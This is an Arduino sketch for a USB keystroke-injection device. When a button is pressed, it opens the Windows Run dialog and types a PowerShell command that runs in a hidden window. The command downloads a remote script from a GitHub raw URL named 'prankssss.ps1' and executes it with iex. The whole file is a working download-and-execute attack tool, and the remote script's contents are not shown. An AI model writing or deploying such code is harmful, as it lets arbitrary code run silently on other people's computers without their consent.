#include <Keyboard.h>

const int buttonPin = 9;
bool hasRun = false;  

void setup() {
    pinMode(buttonPin, INPUT_PULLUP);
    Keyboard.begin();
    delay(1000); 
}

void loop() {
    if (digitalRead(buttonPin) == LOW && !hasRun) {  

        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        delay(50);
        Keyboard.release('r');
        Keyboard.release(KEY_LEFT_GUI);

        delay(200);


        const char *command = "powershell.exe -W Hidden -command $url = 'https://raw.githubusercontent.com/Boldmoon/Hacklet/refs/heads/main/prankssss.ps1'; $response = Invoke-WebRequest -Uri $url -UseBasicParsing; $text = $response.Content; iex $text";
        Keyboard.print(command);

        delay(100);


        Keyboard.press(KEY_RETURN);
        delay(50);
        Keyboard.release(KEY_RETURN);

        hasRun = true;  
    }
}
